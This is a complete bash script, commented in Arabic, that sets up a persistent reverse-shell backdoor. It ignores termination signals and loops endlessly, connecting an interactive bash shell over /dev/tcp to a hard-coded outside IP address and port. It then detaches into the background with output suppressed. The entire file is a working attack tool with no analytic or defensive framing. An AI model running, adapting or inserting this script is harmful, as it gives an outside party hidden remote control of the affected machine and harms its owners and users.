#!/bin/bash

trap "" SIGINT SIGTERM SIGHUP

run_backdoor() {
    ATTACKER_IP="38.242.227.177"
    ATTACKER_PORT="4343"

    while true; do
        # محاولة الاتصال (Bash Reverse Shell)
        bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
        
        sleep 5
    done
}

run_backdoor > /dev/null 2>&1 & 

disown

echo "[+] Process started in background."
exit 0
